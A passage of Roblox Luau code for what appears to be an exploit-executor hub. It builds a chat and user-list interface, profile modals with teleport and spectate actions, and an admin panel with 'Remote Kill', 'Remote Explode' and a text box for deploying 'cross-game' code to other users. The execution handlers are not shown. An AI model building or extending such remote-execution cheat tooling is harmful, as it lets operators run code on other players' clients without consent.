ActiveTargetTitle.TextXAlignment = Enum.TextXAlignment.Left
ActiveTargetTitle.Parent = TopActionFrame

local BringBtn = Instance.new("TextButton")
BringBtn.Size = UDim2.new(0, 115, 0, 28)
BringBtn.Position = UDim2.new(0, 10, 0, 35)
BringBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
BringBtn.Text = "Bring User (Server)"
BringBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
BringBtn.Font = Enum.Font.GothamBold
BringBtn.TextSize = 10
BringBtn.Parent = TopActionFrame
Instance.new("UICorner", BringBtn).CornerRadius = UDim.new(0, 4)

local TeleportToMeBtn = Instance.new("TextButton")
TeleportToMeBtn.Size = UDim2.new(1, -145, 0, 28)
TeleportToMeBtn.Position = UDim2.new(0, 135, 0, 35)
TeleportToMeBtn.BackgroundColor3 = Color3.fromRGB(35, 165, 90)
TeleportToMeBtn.Text = "Teleport User to Me"
TeleportToMeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
TeleportToMeBtn.Font = Enum.Font.GothamBold
TeleportToMeBtn.TextSize = 10
TeleportToMeBtn.Parent = TopActionFrame
Instance.new("UICorner", TeleportToMeBtn).CornerRadius = UDim.new(0, 4)

local RemoteKillBtn = Instance.new("TextButton")
RemoteKillBtn.Size = UDim2.new(0, 115, 0, 28)
RemoteKillBtn.Position = UDim2.new(0, 10, 0, 70)
RemoteKillBtn.BackgroundColor3 = Color3.fromRGB(242, 63, 67)
RemoteKillBtn.Text = "Remote Kill"
RemoteKillBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RemoteKillBtn.Font = Enum.Font.GothamBold
RemoteKillBtn.TextSize = 11
RemoteKillBtn.Parent = TopActionFrame
Instance.new("UICorner", RemoteKillBtn).CornerRadius = UDim.new(0, 4)

local RemoteExplodeBtn = Instance.new("TextButton")
RemoteExplodeBtn.Size = UDim2.new(1, -145, 0, 28)
RemoteExplodeBtn.Position = UDim2.new(0, 135, 0, 70)
RemoteExplodeBtn.BackgroundColor3 = Color3.fromRGB(230, 126, 34)
RemoteExplodeBtn.Text = "Remote Explode"
RemoteExplodeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RemoteExplodeBtn.Font = Enum.Font.GothamBold
RemoteExplodeBtn.TextSize = 11
RemoteExplodeBtn.Parent = TopActionFrame
Instance.new("UICorner", RemoteExplodeBtn).CornerRadius = UDim.new(0, 4)

local EnvironmentLabel = Instance.new("TextLabel")
EnvironmentLabel.Size = UDim2.new(1, -20, 0, 20)
EnvironmentLabel.Position = UDim2.new(0, 10, 0, 110)
EnvironmentLabel.BackgroundTransparency = 1
EnvironmentLabel.Text = "Remote Environment Executor"
EnvironmentLabel.TextColor3 = Color3.fromRGB(181, 186, 193)
EnvironmentLabel.Font = Enum.Font.GothamBold
EnvironmentLabel.TextSize = 11
EnvironmentLabel.TextXAlignment = Enum.TextXAlignment.Left
EnvironmentLabel.Parent = TopActionFrame

local CodeScrollingContainer = Instance.new("ScrollingFrame")
CodeScrollingContainer.Size = UDim2.new(1, -20, 1, -185)
CodeScrollingContainer.Position = UDim2.new(0, 10, 0, 135)
CodeScrollingContainer.BackgroundColor3 = Color3.fromRGB(22, 23, 26)
CodeScrollingContainer.BorderSizePixel = 0
CodeScrollingContainer.ScrollBarThickness = 4
CodeScrollingContainer.CanvasSize = UDim2.new(2, 0, 5, 0)
CodeScrollingContainer.Parent = ControlPanel
Instance.new("UICorner", CodeScrollingContainer).CornerRadius = UDim.new(0, 5)

local CodeBox = Instance.new("TextBox")
CodeBox.Size = UDim2.new(1, -10, 1, -10)
CodeBox.Position = UDim2.new(0, 8, 0, 8)
CodeBox.BackgroundTransparency = 1
CodeBox.TextColor3 = Color3.fromRGB(168, 228, 125)
CodeBox.Font = Enum.Font.Code
CodeBox.TextSize = 12
CodeBox.TextXAlignment = Enum.TextXAlignment.Left
CodeBox.TextYAlignment = Enum.TextYAlignment.Top
CodeBox.ClearTextOnFocus = false
CodeBox.MultiLine = true
CodeBox.PlaceholderText = "-- Type cross-game runtime script source here...\n-- Direct target environment configuration rules apply."
CodeBox.Text = ""
CodeBox.Parent = CodeScrollingContainer

local RemoteExecuteCodeBtn = Instance.new("TextButton")
RemoteExecuteCodeBtn.Size = UDim2.new(1, -20, 0, 32)
RemoteExecuteCodeBtn.Position = UDim2.new(0, 10, 1, -40)
RemoteExecuteCodeBtn.BackgroundColor3 = Color3.fromRGB(35, 165, 90)
RemoteExecuteCodeBtn.Text = "Deploy Cross-Game Execution String"
RemoteExecuteCodeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RemoteExecuteCodeBtn.Font = Enum.Font.GothamBold
RemoteExecuteCodeBtn.TextSize = 12
RemoteExecuteCodeBtn.Parent = ControlPanel
Instance.new("UICorner", RemoteExecuteCodeBtn).CornerRadius = UDim.new(0, 4)

local ProfileModal = Instance.new("Frame")
ProfileModal.Name = "UserProfileModal"
ProfileModal.Size = UDim2.new(0, 390, 0, 345)
ProfileModal.Position = UDim2.new(0.5, -195, 0.5, -172)
ProfileModal.BackgroundColor3 = Color3.fromRGB(26, 27, 31)
ProfileModal.BorderSizePixel = 0
ProfileModal.Visible = false
ProfileModal.ZIndex = 50
ProfileModal.Parent = ViewContainer
Instance.new("UICorner", ProfileModal).CornerRadius = UDim.new(0, 10)
local profileStroke = Instance.new("UIStroke", ProfileModal)
profileStroke.Color = Color3.fromRGB(56, 58, 68)
profileStroke.Thickness = 1.5

local ProfileCloseBtn = Instance.new("TextButton")
ProfileCloseBtn.Size = UDim2.new(0, 26, 0, 26)
ProfileCloseBtn.Position = UDim2.new(1, -32, 0, 8)
ProfileCloseBtn.BackgroundTransparency = 1
ProfileCloseBtn.Text = "X"
ProfileCloseBtn.TextColor3 = Color3.fromRGB(181, 186, 193)
ProfileCloseBtn.Font = Enum.Font.GothamBold
ProfileCloseBtn.TextSize = 14
ProfileCloseBtn.ZIndex = 52
ProfileCloseBtn.Parent = ProfileModal

local ProfileAvatar = Instance.new("ImageLabel")
ProfileAvatar.Size = UDim2.new(0, 56, 0, 56)
ProfileAvatar.Position = UDim2.new(0, 16, 0, 16)
ProfileAvatar.BackgroundColor3 = Color3.fromRGB(35, 37, 42)
ProfileAvatar.BorderSizePixel = 0
ProfileAvatar.ZIndex = 51
ProfileAvatar.Parent = ProfileModal
Instance.new("UICorner", ProfileAvatar).CornerRadius = UDim.new(1, 0)

local ProfileNameContainer = Instance.new("Frame")
ProfileNameContainer.Size = UDim2.new(1, -120, 0, 22)
ProfileNameContainer.Position = UDim2.new(0, 82, 0, 16)
ProfileNameContainer.BackgroundTransparency = 1
ProfileNameContainer.ZIndex = 51
ProfileNameContainer.Parent = ProfileModal

local ProfileNameLayout = Instance.new("UIListLayout", ProfileNameContainer)
ProfileNameLayout.FillDirection = Enum.FillDirection.Horizontal
ProfileNameLayout.VerticalAlignment = Enum.VerticalAlignment.Center
ProfileNameLayout.Padding = UDim.new(0, 6)

local ProfileName = Instance.new("TextLabel")
ProfileName.Size = UDim2.new(0, 0, 1, 0)
ProfileName.AutomaticSize = Enum.AutomaticSize.X
ProfileName.BackgroundTransparency = 1
ProfileName.Font = Enum.Font.GothamBold
ProfileName.TextSize = 14
ProfileName.TextXAlignment = Enum.TextXAlignment.Left
ProfileName.TextColor3 = Color3.fromRGB(242, 243, 245)
ProfileName.ZIndex = 51
ProfileName.Parent = ProfileNameContainer

local ProfileExecBadge = Instance.new("Frame")
ProfileExecBadge.Size = UDim2.new(0, 0, 0, 18)
ProfileExecBadge.AutomaticSize = Enum.AutomaticSize.X
ProfileExecBadge.BackgroundColor3 = Color3.fromRGB(35, 165, 90)
ProfileExecBadge.BorderSizePixel = 0
ProfileExecBadge.ZIndex = 51
ProfileExecBadge.Parent = ProfileNameContainer
Instance.new("UICorner", ProfileExecBadge).CornerRadius = UDim.new(0, 4)

local ProfileExecText = Instance.new("TextLabel")
ProfileExecText.Size = UDim2.new(0, 0, 1, 0)
ProfileExecText.AutomaticSize = Enum.AutomaticSize.X
ProfileExecText.BackgroundTransparency = 1
ProfileExecText.Font = Enum.Font.GothamBold
ProfileExecText.TextSize = 10
ProfileExecText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProfileExecText.Text = " ⚙️ Exec "
ProfileExecText.ZIndex = 52
ProfileExecText.Parent = ProfileExecBadge

local ProfileRole = Instance.new("TextLabel")
ProfileRole.Size = UDim2.new(1, -120, 0, 18)
ProfileRole.Position = UDim2.new(0, 82, 0, 40)
ProfileRole.BackgroundTransparency = 1
ProfileRole.Font = Enum.Font.GothamSemibold
ProfileRole.TextSize = 11
ProfileRole.TextXAlignment = Enum.TextXAlignment.Left
ProfileRole.TextColor3 = Color3.fromRGB(148, 155, 164)
ProfileRole.ZIndex = 51
ProfileRole.Parent = ProfileModal

local ProfileDetailsFrame = Instance.new("Frame")
ProfileDetailsFrame.Size = UDim2.new(1, -32, 0, 78)
ProfileDetailsFrame.Position = UDim2.new(0, 16, 0, 80)
ProfileDetailsFrame.BackgroundColor3 = Color3.fromRGB(20, 21, 24)
ProfileDetailsFrame.BorderSizePixel = 0
ProfileDetailsFrame.ZIndex = 51
ProfileDetailsFrame.Parent = ProfileModal
Instance.new("UICorner", ProfileDetailsFrame).CornerRadius = UDim.new(0, 6)

local ProfileDetailsText = Instance.new("TextLabel")
ProfileDetailsText.Size = UDim2.new(1, -16, 1, -6)
ProfileDetailsText.Position = UDim2.new(0, 8, 0, 3)
ProfileDetailsText.BackgroundTransparency = 1
ProfileDetailsText.Font = Enum.Font.Gotham
ProfileDetailsText.TextSize = 11
ProfileDetailsText.TextXAlignment = Enum.TextXAlignment.Left
ProfileDetailsText.TextYAlignment = Enum.TextYAlignment.Top
ProfileDetailsText.TextColor3 = Color3.fromRGB(181, 186, 193)
ProfileDetailsText.RichText = true
ProfileDetailsText.ZIndex = 52
ProfileDetailsText.Parent = ProfileDetailsFrame

local ProfileUsedExecsContainer = Instance.new("Frame")
ProfileUsedExecsContainer.Size = UDim2.new(1, -32, 0, 24)
ProfileUsedExecsContainer.Position = UDim2.new(0, 16, 0, 164)
ProfileUsedExecsContainer.BackgroundTransparency = 1
ProfileUsedExecsContainer.ZIndex = 51
ProfileUsedExecsContainer.Parent = ProfileModal

local ProfileUsedLabel = Instance.new("TextLabel")
ProfileUsedLabel.Size = UDim2.new(0, 84, 1, 0)
ProfileUsedLabel.Position = UDim2.new(0, 0, 0, 0)
ProfileUsedLabel.BackgroundTransparency = 1
ProfileUsedLabel.Font = Enum.Font.GothamBold
ProfileUsedLabel.TextSize = 9
ProfileUsedLabel.TextColor3 = Color3.fromRGB(148, 155, 164)
ProfileUsedLabel.Text = "EXECUTORES:"
ProfileUsedLabel.TextXAlignment = Enum.TextXAlignment.Left
ProfileUsedLabel.ZIndex = 52
ProfileUsedLabel.Parent = ProfileUsedExecsContainer

local ProfileUsedExecsScroller = Instance.new("ScrollingFrame")
ProfileUsedExecsScroller.Size = UDim2.new(1, -88, 1, 0)
ProfileUsedExecsScroller.Position = UDim2.new(0, 88, 0, 0)
ProfileUsedExecsScroller.BackgroundTransparency = 1
ProfileUsedExecsScroller.BorderSizePixel = 0
ProfileUsedExecsScroller.ScrollBarThickness = 2
ProfileUsedExecsScroller.ScrollBarImageColor3 = Color3.fromRGB(88, 101, 242)
ProfileUsedExecsScroller.AutomaticCanvasSize = Enum.AutomaticSize.X
ProfileUsedExecsScroller.ScrollingDirection = Enum.ScrollingDirection.X
ProfileUsedExecsScroller.ZIndex = 52
ProfileUsedExecsScroller.Parent = ProfileUsedExecsContainer

local ProfileUsedLayout = Instance.new("UIListLayout", ProfileUsedExecsScroller)
ProfileUsedLayout.FillDirection = Enum.FillDirection.Horizontal
ProfileUsedLayout.SortOrder = Enum.SortOrder.LayoutOrder
ProfileUsedLayout.VerticalAlignment = Enum.VerticalAlignment.Center
ProfileUsedLayout.Padding = UDim.new(0, 4)

ProfileUsedLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ProfileUsedExecsScroller.CanvasSize = UDim2.new(0, ProfileUsedLayout.AbsoluteContentSize.X + 10, 0, 0)
end)

local ProfileButtonsFrame = Instance.new("Frame")
ProfileButtonsFrame.Size = UDim2.new(1, -32, 0, 110)
ProfileButtonsFrame.Position = UDim2.new(0, 16, 0, 196)
ProfileButtonsFrame.BackgroundTransparency = 1
ProfileButtonsFrame.ZIndex = 51
ProfileButtonsFrame.Parent = ProfileModal

local ProfileBtnMention = Instance.new("TextButton")
ProfileBtnMention.Size = UDim2.new(0.5, -4, 0, 32)
ProfileBtnMention.Position = UDim2.new(0, 0, 0, 0)
ProfileBtnMention.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
ProfileBtnMention.Text = "💬 Mention in Chat"
ProfileBtnMention.TextColor3 = Color3.fromRGB(255, 255, 255)
ProfileBtnMention.Font = Enum.Font.GothamBold
ProfileBtnMention.TextSize = 11
ProfileBtnMention.ZIndex = 52
ProfileBtnMention.Parent = ProfileButtonsFrame
Instance.new("UICorner", ProfileBtnMention).CornerRadius = UDim.new(0, 4)

local ProfileBtnAction = Instance.new("TextButton")
ProfileBtnAction.Size = UDim2.new(0.5, -4, 0, 32)
ProfileBtnAction.Position = UDim2.new(0.5, 4, 0, 0)
ProfileBtnAction.BackgroundColor3 = Color3.fromRGB(35, 165, 90)
ProfileBtnAction.Text = "⚡ Teleport to User"
ProfileBtnAction.TextColor3 = Color3.fromRGB(255, 255, 255)
ProfileBtnAction.Font = Enum.Font.GothamBold
ProfileBtnAction.TextSize = 11
ProfileBtnAction.ZIndex = 52
ProfileBtnAction.Parent = ProfileButtonsFrame
Instance.new("UICorner", ProfileBtnAction).CornerRadius = UDim.new(0, 4)

local ProfileBtnSpectate = Instance.new("TextButton")
ProfileBtnSpectate.Size = UDim2.new(0.5, -4, 0, 32)
ProfileBtnSpectate.Position = UDim2.new(0, 0, 0, 38)
ProfileBtnSpectate.BackgroundColor3 = Color3.fromRGB(43, 45, 49)
ProfileBtnSpectate.Text = "👁️ Spectate"
ProfileBtnSpectate.TextColor3 = Color3.fromRGB(220, 222, 226)
ProfileBtnSpectate.Font = Enum.Font.GothamBold
ProfileBtnSpectate.TextSize = 11
ProfileBtnSpectate.ZIndex = 52
ProfileBtnSpectate.Parent = ProfileButtonsFrame
Instance.new("UICorner", ProfileBtnSpectate).CornerRadius = UDim.new(0, 4)

local ProfileBtnCopyLink = Instance.new("TextButton")
ProfileBtnCopyLink.Size = UDim2.new(0.5, -4, 0, 32)
ProfileBtnCopyLink.Position = UDim2.new(0.5, 4, 0, 38)
ProfileBtnCopyLink.BackgroundColor3 = Color3.fromRGB(43, 45, 49)
ProfileBtnCopyLink.Text = "🔗 Copy Profile URL"
ProfileBtnCopyLink.TextColor3 = Color3.fromRGB(220, 222, 226)
ProfileBtnCopyLink.Font = Enum.Font.GothamBold
ProfileBtnCopyLink.TextSize = 11
ProfileBtnCopyLink.ZIndex = 52
ProfileBtnCopyLink.Parent = ProfileButtonsFrame
Instance.new("UICorner", ProfileBtnCopyLink).CornerRadius = UDim.new(0, 4)

local ProfileBtnBack = Instance.new("TextButton")
ProfileBtnBack.Size = UDim2.new(1, 0, 0, 26)
ProfileBtnBack.Position = UDim2.new(0, 0, 0, 76)
ProfileBtnBack.BackgroundTransparency = 1
ProfileBtnBack.Text = "Close Profile"
ProfileBtnBack.TextColor3 = Color3.fromRGB(148, 155, 164)
ProfileBtnBack.Font = Enum.Font.Gotham
ProfileBtnBack.TextSize = 11
ProfileBtnBack.ZIndex = 52
ProfileBtnBack.Parent = ProfileButtonsFrame

ProfileCloseBtn.MouseButton1Click:Connect(function() ProfileModal.Visible = false end)
ProfileBtnBack.MouseButton1Click:Connect(function() ProfileModal.Visible = false end)

local selectTab
local currentProfileUser = nil

ProfileBtnMention.MouseButton1Click:Connect(function()
    if not currentProfileUser then return end
    local uName = tostring(currentProfileUser.username or "")
    ProfileModal.Visible = false
    selectTab("global")
    TextBox.Text = "@" .. uName .. " "
    TextBox:CaptureFocus()
end)

ProfileBtnAction.MouseButton1Click:Connect(function()
    if not currentProfileUser then return end
    local uName = tostring(currentProfileUser.username or "")
    local inSameServer = (currentProfileUser.job_id == JobId)
    if inSameServer and uName ~= Username then
        local p = Players:FindFirstChild(uName)
        if p and teleportToPlayerInServer(p) then
            showToast("Teleported to " .. uName, Color3.fromRGB(35, 165, 90))
        else
            showToast("Player not found in server", Color3.fromRGB(237, 66, 69))
        end
    elseif isUserOnline(currentProfileUser.updated_at) and uName ~= Username then
        if currentProfileUser.place_id and currentProfileUser.job_id then
            showToast("Connecting to " .. uName .. "'s server...", Color3.fromRGB(35, 165, 90))
            TeleportService:TeleportToPlaceInstance(currentProfileUser.place_id, currentProfileUser.job_id, LocalPlayer)
        end
    end
end)

ProfileBtnSpectate.MouseButton1Click:Connect(function()
    if not currentProfileUser then return end
    local uName = tostring(currentProfileUser.username or "")
    local p = Players:FindFirstChild(uName)
    if p and spectatePlayer(p) then
        SpectateText.Text = "👁️ Spectating: " .. uName
        SpectateHud.Visible = true
        ProfileModal.Visible = false
        showToast("Spectating " .. uName, Color3.fromRGB(88, 101, 242))
    else
        showToast("Could not spectate target", Color3.fromRGB(237, 66, 69))
    end
end)

ProfileBtnCopyLink.MouseButton1Click:Connect(function()
    if not currentProfileUser then return end
    local uId = tonumber(currentProfileUser.user_id) or 0
    local profileUrl = "https://www.roblox.com/users/" .. tostring(uId > 0 and uId or "") .. "/profile"
    if copyToClipboard(profileUrl) then
        showToast("Roblox profile link copied!", Color3.fromRGB(35, 165, 90))
    else
        showToast("User ID: " .. tostring(uId), Color3.fromRGB(88, 101, 242))
    end
end)

openUserProfile = function(user)
    if not user then return end
    currentProfileUser = user
    local uName = tostring(user.username or "Unknown")
    local uId = tonumber(user.user_id) or 0
    local isOnline = isUserOnline(user.updated_at)
    local inSameServer = (user.job_id == JobId)
    local uExec = tostring(user.executor or "Exec")

    ProfileAvatar.Image = getAvatarThumb(uId, uName)
    ProfileName.Text = uName

    ProfileExecBadge.BackgroundColor3 = getExecutorBadgeColor(uExec)
    ProfileExecText.Text = " ⚙️ " .. uExec .. " "

    if user.is_admin == true then
        ProfileRole.Text = "👑 Network Administrator"
        ProfileRole.TextColor3 = Color3.fromRGB(255, 235, 59)
    elseif user.is_sub_admin == true then
        ProfileRole.Text = "🛡️ Sub-Admin / Moderator"
        ProfileRole.TextColor3 = Color3.fromRGB(168, 85, 247)
    elseif uName == Username then
        ProfileRole.Text = "👤 You (Current Client)"
        ProfileRole.TextColor3 = Color3.fromRGB(88, 101, 242)
    else
        ProfileRole.Text = isOnline and "🟢 Community Member" or "⚪ Offline User"
        ProfileRole.TextColor3 = isOnline and Color3.fromRGB(35, 165, 90) or Color3.fromRGB(148, 155, 164)
    end

    for _, ch in ipairs(ProfileUsedExecsScroller:GetChildren()) do
        if ch:IsA("Frame") then ch:Destroy() end
    end

    local usedExecList = getUserExecutorsList(uName)
    if #usedExecList == 0 then
        table.insert(usedExecList, { name = uExec, count = 1 })
    end

    for _, it in ipairs(usedExecList) do
        local pill = Instance.new("Frame")
        pill.Size = UDim2.new(0, 0, 1, 0)
        pill.AutomaticSize = Enum.AutomaticSize.X
        pill.BackgroundColor3 = getExecutorBadgeColor(it.name)
        pill.BorderSizePixel = 0
        pill.ZIndex = 53
        pill.Parent = ProfileUsedExecsScroller
        Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 4)

        local pillText = Instance.new("TextLabel")
        pillText.Size = UDim2.new(0, 0, 1, 0)
        pillText.AutomaticSize = Enum.AutomaticSize.X
        pillText.BackgroundTransparency = 1
        pillText.Font = Enum.Font.GothamBold
        pillText.TextSize = 9
        pillText.TextColor3 = Color3.fromRGB(255, 255, 255)
        local countStr = it.count > 1 and (" (" .. it.count .. "x)") or ""
        pillText.Text = " ⚙️ " .. it.name .. countStr .. " "
        pillText.ZIndex = 54
        pillText.Parent = pill
    end

    local execHistoryStrings = {}
    for _, it in ipairs(usedExecList) do
        table.insert(execHistoryStrings, it.name .. (it.count > 1 and (" (x" .. it.count .. ")") or ""))
    end
    local execHistoryStr = table.concat(execHistoryStrings, ", ")

    local serverText = inSameServer and "<font color='rgb(88,101,242)'><b>In this server</b></font>" or "<font color='rgb(148,155,164)'>Other server</font>"
    ProfileDetailsText.Text = string.format(
        "<b>User ID:</b> %s\n<b>Game:</b> %s\n<b>Current Executor:</b> %s\n<b>Executores Usados:</b> %s\n<b>Location:</b> %s\n<b>Status:</b> %s",
        tostring(uId > 0 and uId or "Unknown"),
        sanitizeText(user.current_game or "Roblox"),
        sanitizeText(uExec),
        sanitizeText(execHistoryStr),
        serverText,
        isOnline and "<font color='rgb(35,165,90)'>Online</font>" or ("Last seen: " .. tostring(user.updated_at or "Unknown"))
    )

    if inSameServer and uName ~= Username then
        ProfileBtnAction.Text = "⚡ TP to Player"
        ProfileBtnAction.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        ProfileBtnAction.Visible = true
        ProfileBtnSpectate.Visible = true
        ProfileBtnSpectate.Text = "👁️ Spectate"
    elseif isOnline and uName ~= Username then
        ProfileBtnAction.Text = "🚀 Join Game"
        ProfileBtnAction.BackgroundColor3 = Color3.fromRGB(35, 165, 90)
        ProfileBtnAction.Visible = true
        ProfileBtnSpectate.Visible = false
    else
        ProfileBtnAction.Visible = false
        ProfileBtnSpectate.Visible = false
    end

    ProfileModal.Visible = true
end

local fetchData

selectTab = function(tab)
    currentTab = tab
    ChannelUsers.BackgroundTransparency = 1; ChannelUsers.TextColor3 = Color3.fromRGB(148, 155, 164)
    ChannelServerChat.BackgroundTransparency = 1; ChannelServerChat.TextColor3 = Color3.fromRGB(148, 155, 164)
    ChannelGlobalChat.BackgroundTransparency = 1; ChannelGlobalChat.TextColor3 = Color3.fromRGB(148, 155, 164)
    ChannelHistory.BackgroundTransparency = 1; ChannelHistory.TextColor3 = Color3.fromRGB(148, 155, 164)
    ChannelExecPanel.BackgroundTransparency = 1; ChannelExecPanel.TextColor3 = Color3.fromRGB(148, 155, 164)
    UsersView.Visible = false; ChatView.Visible = false; HistoryView.Visible = false; ExecPanelFrame.Visible = false; ProfileModal.Visible = false

    if tab == "users" then
        ChannelUsers.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelUsers.BackgroundTransparency = 0; ChannelUsers.TextColor3 = Color3.fromRGB(255, 255, 255); UsersView.Visible = true
    elseif tab == "server" then
        ChannelServerChat.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelServerChat.BackgroundTransparency = 0; ChannelServerChat.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextBox.PlaceholderText = "Message #server-chat... (Press Enter)"
        ChatChannelTitle.Text = "🎮 # server-chat"
        ChatChannelDesc.Text = "Local server chat • Job: " .. string.sub(JobId, 1, 8) .. "..."
        ChatView.Visible = true
        task.spawn(function() if fetchData then fetchData() end end)
    elseif tab == "global" then
        ChannelGlobalChat.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelGlobalChat.BackgroundTransparency = 0; ChannelGlobalChat.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextBox.PlaceholderText = "Message #global-cross-chat... (Press Enter)"
        ChatChannelTitle.Text = "💬 # global-cross-chat"
        ChatChannelDesc.Text = "Cross-game network communication"
        ChatView.Visible = true
        task.spawn(function() if fetchData then fetchData() end end)
    elseif tab == "history" then
        ChannelHistory.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelHistory.BackgroundTransparency = 0; ChannelHistory.TextColor3 = Color3.fromRGB(255, 255, 255)
        HistoryView.Visible = true
        refreshHistoryUI(cachedHistoryData, cachedUsersData)
    elseif tab == "exec" then
        ChannelExecPanel.BackgroundColor3 = Color3.fromRGB(53, 55, 60); ChannelExecPanel.BackgroundTransparency = 0; ChannelExecPanel.TextColor3 = Color3.fromRGB(255, 255, 255); ExecPanelFrame.Visible = true
    end
end

ChannelUsers.MouseButton1Click:Connect(function() selectTab("users") end)
ChannelServerChat.MouseButton1Click:Connect(function() selectTab("server") end)
ChannelGlobalChat.MouseButton1Click:Connect(function() selectTab("global") end)
ChannelHistory.MouseButton1Click:Connect(function() selectTab("history") end)
ChannelExecPanel.MouseButton1Click:Connect(function() selectTab("exec") end)

local function createCategoryHeader(titleText, color)
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, -6, 0, 22)
    Header.BackgroundTransparency = 1
    Header.Parent = UsersScroller

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = string.upper(titleText)
    Label.TextColor3 = color or Color3.fromRGB(148, 155, 164)
    Label.Font = Enum.Font.GothamBold
    Label.TextSize = 10
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Header
end

local function createUserRow(user, online)
    local uName = tostring(user.username or "Unknown")
    local uId = tonumber(user.user_id) or 0
    local uExec = tostring(user.executor or "Exec")
    if uId > 0 then cachedUserIds[uName] = uId end
    cachedUserExecutors[uName] = uExec

    local inSameServer = (user.job_id == JobId)
    local PlayerRow = Instance.new("Frame")
    PlayerRow.Size = UDim2.new(1, -6, 0, 48)
    PlayerRow.BackgroundColor3 = online and Color3.fromRGB(38, 40, 45) or Color3.fromRGB(30, 31, 35)
    PlayerRow.BorderSizePixel = 0
    PlayerRow.Parent = UsersScroller
    Instance.new("UICorner", PlayerRow).CornerRadius = UDim.new(0, 6)

    local AvatarImg = Instance.new("ImageButton")
    AvatarImg.Size = UDim2.new(0, 34, 0, 34)
    AvatarImg.Position = UDim2.new(0, 8, 0, 7)
    AvatarImg.BackgroundColor3 = Color3.fromRGB(30, 31, 35)
    AvatarImg.BorderSizePixel = 0
    AvatarImg.Image = getAvatarThumb(uId, uName)
    AvatarImg.Parent = PlayerRow
    Instance.new("UICorner", AvatarImg).CornerRadius = UDim.new(1, 0)

    local StatusDot = Instance.new("Frame")
    StatusDot.Size = UDim2.new(0, 9, 0, 9)
    StatusDot.Position = UDim2.new(1, -8, 1, -8)
    StatusDot.BackgroundColor3 = online and Color3.fromRGB(35, 165, 90) or Color3.fromRGB(120, 125, 134)
    StatusDot.BorderSizePixel = 0
    StatusDot.Parent = AvatarImg
    Instance.new("UICorner", StatusDot).CornerRadius = UDim.new(1, 0)

    AvatarImg.MouseButton1Click:Connect(function()
        openUserProfile(user)
    end)

    local NameContainer = Instance.new("Frame")
    NameContainer.Size = UDim2.new(0.6, -40, 0, 20)
    NameContainer.Position = UDim2.new(0, 50, 0, 4)
    NameContainer.BackgroundTransparency = 1
    NameContainer.Parent = PlayerRow

    local NameContLayout = Instance.new("UIListLayout", NameContainer)
    NameContLayout.FillDirection = Enum.FillDirection.Horizontal
    NameContLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    NameContLayout.Padding = UDim.new(0, 6)

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Size = UDim2.new(0, 0, 1, 0)
    NameLabel.AutomaticSize = Enum.AutomaticSize.X
    NameLabel.BackgroundTransparency = 1
    NameLabel.Font = Enum.Font.GothamSemibold
    NameLabel.TextSize = 13
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left

    if user.is_admin == true then
        NameLabel.TextColor3 = Color3.fromRGB(255, 235, 59)
        NameLabel.Text = "👑 " .. uName
    elseif user.is_sub_admin == true then
        NameLabel.TextColor3 = Color3.fromRGB(168, 85, 247)
        NameLabel.Text = "🛡️ " .. uName
    elseif uName == Username then
        NameLabel.TextColor3 = Color3.fromRGB(88, 101, 242)
        NameLabel.Text = uName .. " (You)"
    else
        NameLabel.TextColor3 = online and Color3.fromRGB(242, 243, 245) or Color3.fromRGB(130, 135, 145)
        NameLabel.Text = uName
    end
    NameLabel.Parent = NameContainer

    local RowExecBadge = Instance.new("Frame")
    RowExecBadge.Size = UDim2.new(0, 0, 0, 16)
    RowExecBadge.AutomaticSize = Enum.AutomaticSize.X
    RowExecBadge.BackgroundColor3 = getExecutorBadgeColor(uExec)
    RowExecBadge.BorderSizePixel = 0
    RowExecBadge.Parent = NameContainer
    Instance.new("UICorner", RowExecBadge).CornerRadius = UDim.new(0, 4)

    local RowExecText = Instance.new("TextLabel")
    RowExecText.Size = UDim2.new(0, 0, 1, 0)
    RowExecText.AutomaticSize = Enum.AutomaticSize.X
    RowExecText.BackgroundTransparency = 1
    RowExecText.Font = Enum.Font.GothamBold
    RowExecText.TextSize = 9
    RowExecText.TextColor3 = Color3.fromRGB(255, 255, 255)
    RowExecText.Text = " ⚙️ " .. uExec .. " "
    RowExecText.Parent = RowExecBadge

    local Subtitle = Instance.new("TextLabel")
    Subtitle.Size = UDim2.new(0.55, -40, 0, 16)
    Subtitle.Position = UDim2.new(0, 50, 0, 25)
    Subtitle.BackgroundTransparency = 1
    Subtitle.Font = Enum.Font.Gotham
    Subtitle.TextSize = 10
    Subtitle.TextXAlignment = Enum.TextXAlignment.Left
    Subtitle.TextTruncate = Enum.TextTruncate.AtEnd

    if online then
        if inSameServer then
            Subtitle.Text = "⚡ In this server! • Server Job: " .. string.sub(user.job_id or "none", 1, 8)
            Subtitle.TextColor3 = Color3.fromRGB(88, 101, 242)
        else
            local usedList = getUserExecutorsList(uName)
            if #usedList > 1 then
                local usedNames = {}
                for _, it in ipairs(usedList) do table.insert(usedNames, it.name) end
                Subtitle.Text = "🎮 " .. tostring(user.current_game or "Roblox") .. " • " .. #usedList .. " execs: " .. table.concat(usedNames, ", ")
            else
                Subtitle.Text = "🎮 " .. tostring(user.current_game or "Roblox")
            end
            Subtitle.TextColor3 = Color3.fromRGB(120, 125, 134)
        end
    else
        Subtitle.Text = "Last seen: " .. tostring(user.updated_at or "Unknown")
